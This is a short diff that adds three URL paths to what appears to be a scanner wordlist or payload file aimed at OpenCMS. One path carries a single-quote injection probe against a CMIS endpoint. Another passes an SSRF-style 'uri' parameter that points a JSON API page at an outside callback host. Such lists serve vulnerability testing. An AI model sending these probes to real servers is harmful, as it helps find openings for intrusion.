@@ -1,0 +1,3 @@
+/opencms/cmisatom/cmis-online/type?id=1%27
+{{paths}}
+/system/modules/alkacon.mercury.template.jsondemo/elements/jsonapi.jsp?content&fallbackLocale&locale=en&rows=1&uri=http://interact.sh
